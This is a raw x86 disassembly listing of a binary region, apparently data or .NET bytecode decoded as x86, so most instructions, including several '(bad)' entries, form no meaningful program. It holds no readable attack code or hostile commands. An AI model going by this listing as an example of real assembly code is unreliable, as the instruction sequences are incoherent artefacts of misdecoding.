  40340c:	add    BYTE PTR [eax],al
  40340e:	or     dl,BYTE PTR [ebx]
  403410:	or     DWORD PTR [edx+0x43],esi
  403413:	add    eax,0x11067000
  403418:	or     DWORD PTR [eax],ebp
  40341a:	push   es
  40341b:	add    BYTE PTR [eax],al
  40341d:	push   es
  40341e:	sub    BYTE PTR [ebp+0x0],dl
  403421:	add    BYTE PTR [esi],al
  403423:	push   ss
  403424:	adc    ecx,DWORD PTR [edx]
  403426:	ficom  WORD PTR [ebx]
  403428:	adc    DWORD PTR [edi+edx*1],ecx
  40342b:	pop    eax
  40342c:	adc    ecx,DWORD PTR [ecx+edx*1]
  40342f:	or     al,0x11
  403431:	or     ecx,DWORD PTR [esi-0x106c097]
  403437:	(bad)  
  403438:	call   DWORD PTR [edi]
  40343a:	sub    dl,BYTE PTR [ecx]
  40343c:	or     ch,BYTE PTR [edx]
  40343e:	add    BYTE PTR [eax],al
  403440:	add    DWORD PTR [eax],ebp
  403442:	add    BYTE PTR [eax],al
  403444:	add    BYTE PTR [eax],al
  403446:	inc    eax
  403447:	add    BYTE PTR [edx],bl
  403449:	pop    edx
  40344a:	add    BYTE PTR [ecx],bl
  40344c:	inc    esp
  40344d:	add    BYTE PTR [eax],al
  40344f:	add    DWORD PTR [eax],eax
  403451:	add    BYTE PTR [eax],dh
  403453:	add    BYTE PTR [eax+0x78],cl
  403456:	add    BYTE PTR [eax+0x43],dh
  403459:	add    BYTE PTR [eax],al
  40345b:	add    DWORD PTR [eax],eax
  40345d:	add    BYTE PTR [eax],dh
  40345f:	add    BYTE PTR [eax-0x18],cl
  403462:	add    BYTE PTR [eax],bh
  403464:	or     al,0x0
  403466:	add    BYTE PTR [ecx],al
  403468:	sbb    esi,DWORD PTR [eax]
  40346a:	or     DWORD PTR [eax],eax
  40346c:	jns    0x40346f
  40346e:	add    BYTE PTR [eax],al
  403470:	adc    al,BYTE PTR [eax]
  403472:	add    BYTE PTR [ecx],dl
  403474:	jle    0x4034d2
  403476:	add    BYTE PTR [eax],al
  403478:	add    al,0x2
  40347a:	outs   dx,DWORD PTR ds:[esi]
  40347b:	pop    edi
  40347c:	add    BYTE PTR [eax],al
  40347e:	or     dh,BYTE PTR [edi+ecx*1+0x0]
  403482:	add    BYTE PTR [edx],al
  403484:	or     al,BYTE PTR [esi]
  403486:	sub    al,0x2
  403488:	push   es
  403489:	sub    bh,BYTE PTR [esi+0x5b]
  40348c:	add    BYTE PTR [eax],al
  40348e:	add    al,0x7b
  403490:	add    BYTE PTR fs:[eax],al
  403493:	add    al,0x13
  403495:	or     DWORD PTR [esi],edx
  403497:	adc    ecx,DWORD PTR [edx]
  403499:	cmp    BYTE PTR [edi],bh
  40349b:	add    DWORD PTR [eax],eax
  40349d:	add    BYTE PTR [ecx],dl
  40349f:	or     DWORD PTR [ecx],edx
  4034a1:	or     bl,BYTE PTR [edx+0x2803070b]
  4034a7:	push   esi
  4034a8:	add    BYTE PTR [eax],al
  4034aa:	or     cl,BYTE PTR [eax+ecx*1]
  4034ad:	sub    BYTE PTR [ebx+0x0],al
  4034b0:	add    BYTE PTR [edx],cl
  4034b2:	cmp    DWORD PTR [eax],esp
  4034b4:	add    DWORD PTR [eax],eax
  4034b6:	add    BYTE PTR [eax],cl
  4034b8:	adc    al,BYTE PTR [ebx]
  4034ba:	adc    al,BYTE PTR [esi]
  4034bc:	adc    al,BYTE PTR [edi]
  4034be:	adc    al,BYTE PTR [edx+edx*1]
  4034c1:	add    eax,0x3e28
  4034c6:	push   es
  4034c7:	fisub  WORD PTR [ebx]
  4034c9:	es jle 0x403527
  4034cc:	add    BYTE PTR [eax],al
  4034ce:	add    al,0x7b
  4034d0:	push   0x2c040000
  4034d5:	adc    DWORD PTR [edx+0x69],esi
  4034d8:	add    eax,0x8037000
  4034dd:	sub    BYTE PTR [esi],al
  4034df:	add    BYTE PTR [eax],al
  4034e1:	push   es
  4034e2:	sub    BYTE PTR [eax+0x0],ah
  4034e5:	add    BYTE PTR [esi],al
  4034e7:	fucomp st(3)
  4034e9:	add    BYTE PTR [eax],al
  4034eb:	add    BYTE PTR [ecx],cl
  4034ed:	add    ch,BYTE PTR [edi+0x27]
  4034f0:	add    BYTE PTR [eax],al
  4034f2:	push   es
  4034f3:	sub    BYTE PTR [edx+0x0],dl
  4034f6:	add    BYTE PTR [edx],cl
  4034f8:	sub    al,0x31
  4034fa:	adc    DWORD PTR [edx+eax*1],eax
  4034fd:	outs   dx,DWORD PTR ds:[esi]
  4034fe:	sub    BYTE PTR [eax],al
  403500:	add    BYTE PTR [esi],al
  403502:	shl    DWORD PTR [ebx],1
  403504:	adc    DWORD PTR es:0x296f02,eax
  40350b:	add    BYTE PTR [esi],al
  40350d:	shl    DWORD PTR [ebx],1
  40350f:	sbb    ecx,DWORD PTR [eax]
  403511:	jae    0x40353d
  403513:	add    BYTE PTR [eax],al
  403515:	push   es
  403516:	or     bh,BYTE PTR [esi+0x5c]
  403519:	add    BYTE PTR [eax],al
  40351b:	add    al,0x2
  40351d:	push   es
  40351e:	outs   dx,DWORD PTR ds:[esi]
  40351f:	pusha  
  403520:	add    BYTE PTR [eax],al
  403522:	or     al,BYTE PTR [esi]
  403524:	adc    ecx,DWORD PTR [eax]
  403526:	fnstsw WORD PTR [edi+0x7e000000]
  40352c:	pop    ebx
  40352d:	add    BYTE PTR [eax],al
  40352f:	add    al,0x7b
  403531:	push   0x39040000
  403536:	popf   
  403537:	add    BYTE PTR [eax],al
  403539:	add    BYTE PTR [edx-0x77],dh
  40353c:	add    eax,0x8037000
  403541:	jb     0x4034f2
  403543:	add    eax,0x6f027000
  403548:	daa    
  403549:	add    BYTE PTR [eax],al
  40354b:	push   es
  40354c:	adc    ecx,DWORD PTR [ebx]
  40354e:	adc    cl,BYTE PTR [ebx]
  403550:	(bad)  
  403551:	push   ss
  403552:	or     DWORD PTR [eax],eax
  403554:	add    BYTE PTR [ecx],al
  403556:	outs   dx,DWORD PTR ds:[esi]
  403557:	xor    al,0x0
  403559:	add    BYTE PTR [edx],cl
  40355b:	sub    BYTE PTR [ecx],ah
  40355d:	add    BYTE PTR [eax],al
  40355f:	or     ch,BYTE PTR [edi+0x61]
  403562:	add    BYTE PTR [eax],al
  403564:	or     dh,BYTE PTR [edx-0x4d]
  403567:	add    eax,0x17287000
  40356c:	add    BYTE PTR [eax],al
  40356e:	or     al,BYTE PTR [edx]
  403570:	outs   dx,DWORD PTR ds:[esi]
  403571:	sub    BYTE PTR [eax],al
  403573:	add    BYTE PTR [esi],al
  403575:	mov    WORD PTR [eax+eax*1],?
  403578:	add    BYTE PTR [ecx],al
  40357a:	jb     0x403533
  40357c:	add    eax,0x6f027000
  403581:	sub    DWORD PTR [eax],eax
  403583:	add    BYTE PTR [esi],al
  403585:	mov    WORD PTR [eax+eax*1],?
  403588:	add    BYTE PTR [ecx],al
  40358a:	sub    BYTE PTR [eax+0x0],cl
  40358d:	add    BYTE PTR [edx],cl
  40358f:	jb     0x403540
  403591:	add    eax,0x3127000
  403596:	(bad)  
  403597:	push   ss
  403598:	or     DWORD PTR [eax],eax
  40359a:	add    BYTE PTR [ecx],al
  40359c:	outs   dx,DWORD PTR ds:[esi]
  40359d:	xor    al,0x0
  40359f:	add    BYTE PTR [edx],cl
  4035a1:	sub    BYTE PTR [ecx],ah
  4035a3:	add    BYTE PTR [eax],al
  4035a5:	or     ch,BYTE PTR [edi+0x61]
  4035a8:	add    BYTE PTR [eax],al
  4035aa:	or     dh,BYTE PTR [edx-0x4d]
  4035ad:	add    eax,0x17287000
  4035b2:	add    BYTE PTR [eax],al
  4035b4:	or     dl,BYTE PTR [ecx]
  4035b6:	add    al,0x8c
  4035b8:	inc    ebp
  4035b9:	add    BYTE PTR [eax],al
  4035bb:	add    DWORD PTR [edx-0x49],esi
  4035be:	add    eax,0x5117000
  4035c3:	mov    WORD PTR [ebp+0x0],es
  4035c6:	add    BYTE PTR [ecx],al
  4035c8:	sub    BYTE PTR [eax+0x0],cl
  4035cb:	add    BYTE PTR [edx],cl
  4035cd:	sub    BYTE PTR [edx],cl
  4035cf:	add    BYTE PTR [eax],al
  4035d1:	push   es
  4035d2:	sub    BYTE PTR [eax+0x0],ah
  4035d5:	add    BYTE PTR [esi],al
  4035d7:	adc    DWORD PTR [edx],ecx
  4035d9:	pop    ss
  4035da:	pop    eax
  4035db:	adc    ecx,DWORD PTR [edx]
  4035dd:	adc    DWORD PTR [edx],ecx
  4035df:	adc    DWORD PTR [ecx],ecx
  4035e1:	mov    gs,WORD PTR [ecx+0x3f]
  4035e4:	mov    dh,0xfe
  4035e6:	(bad)  
  4035e7:	call   DWORD PTR [edx+ebp*1]
  4035ea:	adc    DWORD PTR [eax],ecx
  4035ec:	sub    al,BYTE PTR [eax]
  4035ee:	add    BYTE PTR [eax],al
  4035f0:	add    DWORD PTR [eax],edx
  4035f2:	add    BYTE PTR [eax],al
  4035f4:	add    BYTE PTR [eax],al
  4035f6:	inc    ebx
  4035f7:	add    BYTE PTR [edx],dl
  4035f9:	push   ebp
  4035fa:	add    BYTE PTR [ebx],ah
  4035fc:	add    DWORD PTR [eax],eax
  4035fe:	add    BYTE PTR [ecx],al
  403600:	adc    esi,DWORD PTR [eax]
  403602:	add    al,0x0
  403604:	add    BYTE PTR ds:[eax],al
  403607:	add    BYTE PTR [ebx],dl
  403609:	add    BYTE PTR [eax],al
  40360b:	adc    DWORD PTR [edx],eax
  40360d:	add    ebp,DWORD PTR [eax]
  40360f:	xor    eax,DWORD PTR [eax]
  403611:	add    BYTE PTR [esi],al
  403613:	or     al,BYTE PTR [esi]
  403615:	sub    eax,0x62a1402
  40361a:	outs   dx,DWORD PTR ds:[esi]
  40361b:	sub    al,0x0
  40361d:	add    BYTE PTR [esi],al
  40361f:	sub    al,0x7
  403621:	push   es
  403622:	outs   dx,DWORD PTR ds:[esi]
  403623:	sub    al,0x0
  403625:	add    BYTE PTR [esi],al
  403627:	sub    al,BYTE PTR [esi]
  403629:	push   es
  40362a:	outs   dx,DWORD PTR ds:[esi]
  40362b:	sub    eax,DWORD PTR [eax]
  40362d:	add    BYTE PTR [esi],al
  40362f:	sub    BYTE PTR [eax],dh
  403631:	add    BYTE PTR [eax],al
  403633:	push   es
  403634:	jae    0x403679
  403636:	add    BYTE PTR [eax],al
  403638:	push   es
  403639:	sub    BYTE PTR ds:0x6f060000,bh
  40363f:	sub    eax,0x6060000
  403644:	outs   dx,DWORD PTR ds:[esi]
  403645:	sub    al,0x0
  403647:	add    BYTE PTR [esi],al
  403649:	sub    al,BYTE PTR [eax]
  40364b:	add    BYTE PTR [ebx],dl
  40364d:	xor    BYTE PTR [ebx],al
  40364f:	add    BYTE PTR [esi],dh
  403651:	add    BYTE PTR [eax],al
  403653:	add    BYTE PTR [eax+eax*1],dl
  403656:	add    BYTE PTR [ecx],dl
  403658:	add    ch,BYTE PTR [edi+0x62]
  40365b:	add    BYTE PTR [eax],al
  40365d:	or     dl,BYTE PTR [edx]
  40365f:	add    BYTE PTR [edx],dl
  403661:	add    DWORD PTR [edi+0x63],ebp
  403664:	add    BYTE PTR [eax],al
  403666:	or     al,BYTE PTR [edi]
  403668:	and    BYTE PTR [esi+eax*4+0x0],ah
  40366c:	add    BYTE PTR [esi],ch
  40366e:	or     BYTE PTR [edi],al
  403670:	and    BYTE PTR [eax],al
  403672:	add    al,BYTE PTR [eax]
  403674:	add    BYTE PTR [ebx],dh
  403676:	add    dl,BYTE PTR [edi]
  403678:	sub    al,BYTE PTR [esi]
  40367a:	pop    ss
  40367b:	cs add eax,0x2c5f1806
  403681:	or     al,BYTE PTR [ebx]
  403683:	sub    BYTE PTR [edi],dh
  403685:	add    BYTE PTR [eax],al
  403687:	push   es
  403688:	sub    al,0x2
  40368a:	pop    ss
  40368b:	sub    dl,BYTE PTR [esi]
  40368d:	sub    al,BYTE PTR [eax]
  40368f:	add    BYTE PTR [ebx],dl
  403691:	xor    BYTE PTR [ebx],al
  403693:	add    BYTE PTR [edi],bh
  403695:	add    BYTE PTR [eax],al
  403697:	add    BYTE PTR ds:0x2110000,dl
  40369d:	outs   dx,DWORD PTR ds:[esi]
  40369e:	bound  eax,QWORD PTR [eax]
  4036a0:	add    BYTE PTR [edx],cl
  4036a2:	adc    al,BYTE PTR [eax]
  4036a4:	adc    al,BYTE PTR [ecx]
  4036a6:	outs   dx,DWORD PTR ds:[esi]
  4036a7:	arpl   WORD PTR [eax],ax
  4036a9:	add    BYTE PTR [edx],cl
  4036ab:	push   es
  4036ac:	sbb    BYTE PTR [edi+0x16],bl
  4036af:	inc    BYTE PTR [ecx]
  4036b1:	push   ss
  4036b2:	inc    BYTE PTR [ecx]
  4036b4:	or     al,0x6
  4036b6:	sbb    bl,BYTE PTR [edi+0x16]
  4036b9:	inc    BYTE PTR [ecx]
  4036bb:	push   ss
  4036bc:	inc    BYTE PTR [ecx]
  4036be:	or     eax,0x372803
  4036c3:	add    BYTE PTR [esi],al
  4036c5:	sub    al,0x5
  4036c7:	or     BYTE PTR [edx+eax*1],ch
  4036ca:	pop    ss
  4036cb:	sub    al,BYTE PTR [ebx]
  4036cd:	sub    BYTE PTR [eax],bh
  4036cf:	add    BYTE PTR [eax],al
  4036d1:	push   es
  4036d2:	sub    al,0x5
  4036d4:	or     DWORD PTR [edx+eax*1],ebp
  4036d7:	pop    ss
  4036d8:	sub    dl,BYTE PTR [esi]
  4036da:	sub    ch,BYTE PTR [esi]
  4036dc:	add    bl,BYTE PTR [edi]
  4036de:	and    BYTE PTR [edi+0x16],bl
  4036e1:	inc    BYTE PTR [ecx]
  4036e3:	push   ss
  4036e4:	inc    BYTE PTR [ecx]
  4036e6:	sub    ch,BYTE PTR [esi]
  4036e8:	add    bl,BYTE PTR [edi]
  4036ea:	adc    BYTE PTR [edi+0x16],bl
  4036ed:	inc    BYTE PTR [ecx]
  4036ef:	push   ss
  4036f0:	inc    BYTE PTR [ecx]
  4036f2:	sub    ch,dh
  4036f4:	add    ch,BYTE PTR ds:0x5bb7207
  4036fa:	add    BYTE PTR [eax+0x10],dh
  4036fd:	add    BYTE PTR [ebx],al
  4036ff:	outs   dx,DWORD PTR ds:[esi]
  403700:	xor    al,BYTE PTR [eax]
  403702:	add    BYTE PTR [edx],cl
  403704:	sub    al,0x12
  403706:	add    al,BYTE PTR [ebx]
  403708:	outs   dx,DWORD PTR ds:[esi]
  403709:	xor    al,BYTE PTR [eax]
  40370b:	add    BYTE PTR [edx],cl
  40370d:	sub    BYTE PTR [edi+0x0],dl
  403710:	add    BYTE PTR [edx],cl
  403712:	jae    0x40372c
  403714:	add    BYTE PTR [eax],al
  403716:	or     bh,BYTE PTR [edx+0x2]
  403719:	add    ebp,DWORD PTR [edi+0x33]
  40371c:	add    BYTE PTR [eax],al
  40371e:	or     ch,BYTE PTR [edi+0x34]
  403721:	add    BYTE PTR [eax],al
  403723:	or     ch,BYTE PTR [eax]
  403725:	push   edi
  403726:	add    BYTE PTR [eax],al
  403728:	or     dh,BYTE PTR [ebx+0x18]
  40372b:	add    BYTE PTR [eax],al
  40372d:	or     bh,BYTE PTR [edx+0x6]
  403730:	sub    bl,BYTE PTR [esi]
  403732:	add    ch,BYTE PTR [eax]
  403734:	push   ds
  403735:	add    BYTE PTR [eax],al
  403737:	or     ch,BYTE PTR [edx]
  403739:	add    BYTE PTR [eax],al
  40373b:	add    BYTE PTR [ebx],dl
  40373d:	xor    BYTE PTR [esi],al
  40373f:	add    dh,ah
  403741:	add    BYTE PTR [eax],al
  403743:	add    BYTE PTR [ebx],dl
  403745:	add    BYTE PTR [eax],al
  403747:	adc    DWORD PTR [esi+0x5b],edi
  40374a:	add    BYTE PTR [eax],al
  40374c:	add    al,0x7b
  40374e:	push   0x2c040000
  403753:	adc    BYTE PTR [edx-0x43],dh
  403756:	add    eax,0x28037000
  40375b:	add    eax,0x28060000
  403760:	pusha  
  403761:	add    BYTE PTR [eax],al
  403763:	push   es
  403764:	add    al,0xe
  403766:	add    al,0xe
  403768:	add    eax,0x2473
  40376d:	push   es
  40376e:	add    ebp,DWORD PTR [eax]
  403770:	xor    eax,DWORD PTR [eax]
  403772:	add    BYTE PTR [esi],al
  403774:	or     al,BYTE PTR [esi]
  403776:	sub    eax,0x5ef724f
  40377b:	add    BYTE PTR [eax+0x3],dh
  40377e:	jb     0x40372f
  403780:	add    eax,0x20f7000
  403785:	(bad)  
  403786:	push   ss
  403787:	or     DWORD PTR [eax],eax
  403789:	add    BYTE PTR [ecx],al
  40378b:	outs   dx,DWORD PTR ds:[esi]
  40378c:	xor    al,0x0
  40378e:	add    BYTE PTR [edx],cl
  403790:	sub    BYTE PTR [ecx],ah
  403792:	add    BYTE PTR [eax],al
  403794:	or     ch,BYTE PTR [edi+0x61]
  403797:	add    BYTE PTR [eax],al
  403799:	or     dh,BYTE PTR [edx-0x4d]
  40379c:	add    eax,0x17287000
  4037a1:	add    BYTE PTR [eax],al
  4037a3:	or     cl,BYTE PTR [esi]
  4037a5:	add    al,0x8c
  4037a7:	inc    ebp
  4037a8:	add    BYTE PTR [eax],al
  4037aa:	add    DWORD PTR [edx-0x49],esi
  4037ad:	add    eax,0x50e7000
  4037b2:	mov    WORD PTR [ebp+0x0],es
  4037b5:	add    BYTE PTR [ecx],al
  4037b7:	sub    BYTE PTR [eax+0x0],cl
  4037ba:	add    BYTE PTR [edx],cl
  4037bc:	sub    BYTE PTR [edi],al
  4037be:	add    BYTE PTR [eax],al
  4037c0:	push   es
  4037c1:	jae    0x4037db
  4037c3:	add    BYTE PTR [eax],al
  4037c5:	or     bh,BYTE PTR [edx+0x7e]
  4037c8:	pop    ebx
  4037c9:	add    BYTE PTR [eax],al
  4037cb:	add    al,0x7b
  4037cd:	push   0x2c040000
  4037d2:	push   esp
  4037d3:	jb     0x4037ec
  4037d5:	push   es
  4037d6:	add    BYTE PTR [eax+0x3],dh
  4037d9:	jb     0x40378a
  4037db:	add    eax,0x20f7000
  4037e0:	(bad)  
  4037e1:	push   ss
  4037e2:	or     DWORD PTR [eax],eax
  4037e4:	add    BYTE PTR [ecx],al
  4037e6:	outs   dx,DWORD PTR ds:[esi]
  4037e7:	xor    al,0x0
  4037e9:	add    BYTE PTR [edx],cl
  4037eb:	sub    BYTE PTR [ecx],ah
  4037ed:	add    BYTE PTR [eax],al
  4037ef:	or     ch,BYTE PTR [edi+0x61]
  4037f2:	add    BYTE PTR [eax],al
  4037f4:	or     dh,BYTE PTR [edx-0x4d]
  4037f7:	add    eax,0x17287000
  4037fc:	add    BYTE PTR [eax],al
  4037fe:	or     cl,BYTE PTR [esi]
  403800:	add    al,0x8c
  403802:	inc    ebp
  403803:	add    BYTE PTR [eax],al
  403805:	add    DWORD PTR [edx-0x49],esi
  403808:	add    eax,0x50e7000
  40380d:	mov    WORD PTR [ebp+0x0],es
  403810:	add    BYTE PTR [ecx],al
  403812:	sub    BYTE PTR [eax+0x0],cl
  403815:	add    BYTE PTR [edx],cl
  403817:	push   es
  403818:	outs   dx,DWORD PTR ds:[esi]
  403819:	sub    eax,DWORD PTR [eax]
  40381b:	add    BYTE PTR [esi],al
  40381d:	sub    BYTE PTR [eax],cl
  40381f:	add    BYTE PTR [eax],al
  403821:	push   es
  403822:	sub    BYTE PTR [eax+0x0],ah
  403825:	add    BYTE PTR [esi],al
  403827:	push   es
  403828:	outs   dx,DWORD PTR ds:[esi]
  403829:	sub    eax,DWORD PTR [eax]
  40382b:	add    BYTE PTR [esi],al
  40382d:	sub    bl,BYTE PTR [esi]
  40382f:	add    ch,BYTE PTR [eax]
  403831:	push   ds
  403832:	add    BYTE PTR [eax],al
  403834:	or     ch,BYTE PTR [edx]
  403836:	add    BYTE PTR [eax],al
  403838:	adc    esi,DWORD PTR [eax]
  40383a:	add    eax,0x4200
  40383f:	add    BYTE PTR [esi],dl
  403841:	add    BYTE PTR [eax],al
  403843:	adc    DWORD PTR [edx],eax
  403845:	sub    BYTE PTR [esi],bl
  403847:	add    BYTE PTR [eax],al
  403849:	or     al,BYTE PTR [ebx]
  40384b:	sub    al,0x1b
  40384d:	add    al,BYTE PTR [ebx]
  40384f:	pop    ss
  403850:	lea    edi,[ebx]
  403852:	add    BYTE PTR [eax],al
  403854:	add    DWORD PTR [edx],ecx
  403856:	push   es
  403857:	push   ss
  403858:	pop    ds
  403859:	cmp    ebx,DWORD PTR [ebp+0x476f06]
  40385f:	add    BYTE PTR [edx],cl
  403861:	jge    0x4038c1
  403863:	add    BYTE PTR [eax],al
  403865:	add    al,0x2b
  403867:	pop    es
  403868:	add    dl,BYTE PTR [edi*2+0x400005e]
  40386f:	sub    BYTE PTR [edi+0x0],ah
  403872:	add    BYTE PTR [edx],cl
  403874:	add    bh,dh
  403876:	push   es
  403877:	inc    ebp
  403878:	add    BYTE PTR [eax],al
  40387a:	push   es
  40387b:	jae    0x4038e5
  40387d:	add    BYTE PTR [eax],al
  40387f:	or     ch,BYTE PTR [edi+0x69]
  403882:	add    BYTE PTR [eax],al
  403884:	or     ch,BYTE PTR [edx]
  403886:	add    BYTE PTR [eax],al
  403888:	adc    esi,DWORD PTR [eax]
  40388a:	add    al,0x0
  40388c:	ja     0x40388f
  40388e:	add    BYTE PTR [eax],al
  403890:	pop    ss
  403891:	add    BYTE PTR [eax],al
  403893:	adc    DWORD PTR [edi+ebp*2],eax
  403896:	push   0x0
  403898:	add    BYTE PTR [edx],cl
  40389a:	or     dl,BYTE PTR [ebx+ecx*1]
  40389d:	add    bh,BYTE PTR [ebx+0x5e]
  4038a0:	add    BYTE PTR [eax],al
  4038a2:	add    al,0x2d
  4038a4:	sbb    BYTE PTR [eax],ch
  4038a6:	add    BYTE PTR [bx+si],al
  4038a9:	or     al,BYTE PTR [esi]
  4038ab:	outs   dx,DWORD PTR ds:[esi]
  4038ac:	imul   eax,DWORD PTR [eax],0x0
  4038af:	or     cl,BYTE PTR [eax+ecx*1]
  4038b2:	sub    BYTE PTR [eax+eax*1+0x0],ch
  4038b6:	or     cl,BYTE PTR [ebx]
  4038b8:	cmp    BYTE PTR [eax],dl
  4038ba:	add    DWORD PTR [eax],eax
  4038bc:	add    BYTE PTR [esi],al
  4038be:	jae    0x40392d
  4038c0:	add    BYTE PTR [eax],al
  4038c2:	or     cl,BYTE PTR ds:0x556f09
  4038c8:	add    BYTE PTR [edx],cl
  4038ca:	adc    eax,DWORD PTR [ecx+edx*1]
  4038cd:	add    al,0x72
  4038cf:	cmp    eax,0x28700006
  4038d4:	push   edi
  4038d5:	add    BYTE PTR [eax],al
  4038d7:	or     dl,BYTE PTR [ebx]
  4038d9:	add    eax,0x47720511
  4038de:	push   es
  4038df:	add    BYTE PTR [eax+0x19],dh
  4038e2:	outs   dx,DWORD PTR ds:[esi]
  4038e3:	outs   dx,BYTE PTR ds:[esi]
  4038e4:	add    BYTE PTR [eax],al
  4038e6:	or     ch,BYTE PTR [ebx+eax*2]
  4038e9:	jb     0x40395c
  4038eb:	push   es
  4038ec:	add    BYTE PTR [eax+0x28],dh
  4038ef:	add    al,0x0
  4038f1:	add    BYTE PTR [esi],al
  4038f3:	sub    BYTE PTR [eax+0x0],ah
  4038f6:	add    BYTE PTR [esi],al
  4038f8:	sub    BYTE PTR [edi+0x0],ch
  4038fb:	add    BYTE PTR [edx],cl
  4038fd:	rol    BYTE PTR [ecx],1
  4038ff:	add    BYTE PTR [eax],al
  403901:	add    DWORD PTR [eax],ebp
  403903:	adc    al,0x0
  403905:	add    BYTE PTR [edx],cl
  403907:	outs   dx,DWORD PTR ds:[esi]
  403908:	sub    al,0x0
  40390a:	add    BYTE PTR [edx],cl
  40390c:	outs   dx,DWORD PTR ds:[esi]
  40390d:	jo     0x40390f
  40390f:	add    BYTE PTR [edx],cl
  403911:	sub    BYTE PTR [ebx],ah
  403913:	add    BYTE PTR [eax],al
  403915:	or     dl,BYTE PTR [ebx]
  403917:	push   es
  403918:	adc    DWORD PTR [esi],eax
  40391a:	jb     0x4038cb
  40391c:	push   es
  40391d:	add    BYTE PTR [eax+0x11],dh
  403920:	add    eax,0x1728
  403925:	or     ch,BYTE PTR [eax]
  403927:	push   esp
  403928:	add    BYTE PTR [eax],al
  40392a:	or     cl,BYTE PTR [ebx]
  40392c:	pop    es
  40392d:	cmp    bl,BYTE PTR [ebx+0x2000000]
  403933:	jnp    0x403993
  403935:	add    BYTE PTR [eax],al
  403937:	add    al,0x13
  403939:	or     al,0x16
  40393b:	adc    ecx,DWORD PTR ds:0xc11302b
  403941:	adc    DWORD PTR ds:0x1107139a,ecx
  403947:	pop    es
  403948:	jb     0x4038f9
  40394a:	push   es
  40394b:	add    BYTE PTR [eax+0x11],dh
  40394e:	add    eax,0x1728
  403953:	or     dl,BYTE PTR [ebx]
  403955:	or     BYTE PTR [ecx],dl
  403957:	or     BYTE PTR [eax],ch
  403959:	inc    ebx
  40395a:	add    BYTE PTR [eax],al
  40395c:	or     ch,BYTE PTR [edx+ecx*1]
  40395f:	adc    DWORD PTR [eax],ecx
  403961:	sub    BYTE PTR [eax+eax*1+0x0],dl
  403965:	or     cl,BYTE PTR [ebx]
  403967:	sub    ecx,DWORD PTR [esi]
  403969:	adc    DWORD PTR ds:0xd135817,ecx
  40396f:	adc    DWORD PTR ds:0x698e0c11,ecx
  403975:	xor    cl,al
  403977:	pop    es
  403978:	sub    eax,0x72041153
  40397d:	mov    bl,0x6
  40397f:	add    BYTE PTR [eax+0x28],dh
  403982:	push   edi
  403983:	add    BYTE PTR [eax],al
  403985:	or     dl,BYTE PTR [ebx]
  403987:	or     DWORD PTR [edx],eax
  403989:	jnp    0x4039e9
  40398b:	add    BYTE PTR [eax],al
  40398d:	add    al,0x13
  40398f:	push   cs
  403990:	push   ss
  403991:	adc    ecx,DWORD PTR [edi]
  403993:	sub    esi,DWORD PTR [eax]
  403995:	adc    DWORD PTR [esi],ecx
  403997:	adc    DWORD PTR [edi],ecx
  403999:	call   0xaf72:0xa110a13
  4039a0:	push   es
  4039a1:	add    BYTE PTR [eax+0x11],dh
  4039a4:	or     DWORD PTR [eax],ebp
  4039a6:	pop    ss
  4039a7:	add    BYTE PTR [eax],al
  4039a9:	or     dl,BYTE PTR [ebx]
  4039ab:	or     edx,DWORD PTR [ecx]
  4039ad:	or     ebp,DWORD PTR [eax]
  4039af:	inc    ebx
  4039b0:	add    BYTE PTR [eax],al
  4039b2:	or     ch,BYTE PTR [edx+ecx*1]
  4039b5:	adc    DWORD PTR [ebx],ecx
  4039b7:	sub    BYTE PTR [eax+eax*1+0x0],dl
  4039bb:	or     cl,BYTE PTR [ebx]
  4039bd:	sub    ecx,DWORD PTR [esi]
  4039bf:	adc    DWORD PTR [edi],ecx
  4039c1:	pop    ss
  4039c2:	pop    eax
  4039c3:	adc    ecx,DWORD PTR [edi]
  4039c5:	adc    DWORD PTR [edi],ecx
  4039c7:	adc    DWORD PTR [esi],ecx
  4039c9:	mov    gs,WORD PTR [ecx+0x32]
  4039cc:	enter  0x2d07,0x11
  4039d0:	jb     0x40398f
  4039d2:	push   es
  4039d3:	add    BYTE PTR [eax+0x6],dh
  4039d6:	sub    BYTE PTR ds:0x73060000,al
  4039dc:	jno    0x4039de
  4039de:	add    BYTE PTR [edx],cl
  4039e0:	jp     0x403a60
  4039e2:	pop    ebx
  4039e3:	add    BYTE PTR [eax],al
  4039e5:	add    al,0x7b
  4039e7:	push   0x2c040000
  4039ec:	sbb    al,0x72
  4039ee:	jmp    0x4039f6
  4039f0:	add    BYTE PTR [eax+0x6],dh
  4039f3:	pop    es
  4039f4:	outs   dx,DWORD PTR ds:[esi]
  4039f5:	jb     0x4039f7
  4039f7:	add    BYTE PTR [edx],cl
  4039f9:	pop    es
  4039fa:	outs   dx,DWORD PTR ds:[esi]
  4039fb:	jae    0x4039fd
  4039fd:	add    BYTE PTR [edx],cl
  4039ff:	sub    BYTE PTR [edi],al
  403a01:	add    BYTE PTR [eax],al
  403a03:	push   es
  403a04:	sub    BYTE PTR [eax+0x0],ah
  403a07:	add    BYTE PTR [esi],al
  403a09:	pop    es
  403a0a:	sub    ah,BYTE PTR [edx+0x7e132d03]
  403a10:	pop    ebx
  403a11:	add    BYTE PTR [eax],al
  403a13:	add    al,0x7b
  403a15:	push   0x2c040000
  403a1a:	sbb    BYTE PTR ds:0x6028,al
  403a20:	push   es
  403a21:	sub    al,BYTE PTR [ebx]
  403a23:	pop    ss
  403a24:	xor    eax,DWORD PTR [edi]
  403a26:	add    eax,0x5b28
  403a2b:	push   es
  403a2c:	sub    al,BYTE PTR ds:0x6028
  403a32:	push   es
  403a33:	sub    dl,BYTE PTR [ebx]
  403a35:	xor    BYTE PTR [edi],al
  403a37:	add    BYTE PTR [ebx+0x18000001],dh
  403a3d:	add    BYTE PTR [eax],al
  403a3f:	adc    DWORD PTR [edx+ecx*1],edx
  403a42:	add    ebp,DWORD PTR [edi+0x2d]
  403a45:	add    BYTE PTR [eax],al
  403a47:	or     cl,BYTE PTR [ebx]
  403a49:	jle    0x403aa6
  403a4b:	add    BYTE PTR [eax],al
  403a4d:	add    al,0x7b
  403a4f:	push   0x2c040000
  403a54:	adc    eax,0x71b72
  403a59:	jo     0x403a5e
  403a5b:	outs   dx,DWORD PTR ds:[esi]
  403a5c:	jb     0x403a5e
  403a5e:	add    BYTE PTR [edx],cl
  403a60:	sub    BYTE PTR ds:0x28060000,al
  403a66:	pusha  
  403a67:	add    BYTE PTR [eax],al
  403a69:	push   es
  403a6a:	jle    0x403ac7
  403a6c:	add    BYTE PTR [eax],al
  403a6e:	add    al,0x7b
  403a70:	imul   eax,DWORD PTR [eax],0x5f180400
  403a76:	cmp    ebp,ebp
  403a78:	add    BYTE PTR [eax],al
  403a7a:	add    BYTE PTR [edi],al
